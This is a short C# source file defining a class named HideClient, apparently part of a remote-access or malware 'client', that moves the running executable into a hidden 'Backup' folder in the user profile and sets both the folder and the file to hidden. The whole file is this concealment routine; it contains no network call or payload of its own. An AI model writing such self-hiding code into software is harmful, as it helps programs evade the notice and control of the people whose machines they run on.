using System;
using System.IO;
using System.Reflection;

namespace Client.Configuration
{
    public static class HideClient
    {
        public static void Execute()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Backup");
            string exePath = Assembly.GetExecutingAssembly().Location;
            string destPath = Path.Combine(backupPath, Path.GetFileName(exePath));

            try
            {
                if (!Directory.Exists(backupPath))
                {
                    Directory.CreateDirectory(backupPath);
                    DirectoryInfo dirInfo = new DirectoryInfo(backupPath);
                    dirInfo.Attributes |= FileAttributes.Hidden;
                }

                if (!File.Exists(destPath))
                {
                    File.Move(exePath, destPath);
                    File.SetAttributes(destPath, FileAttributes.Hidden);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
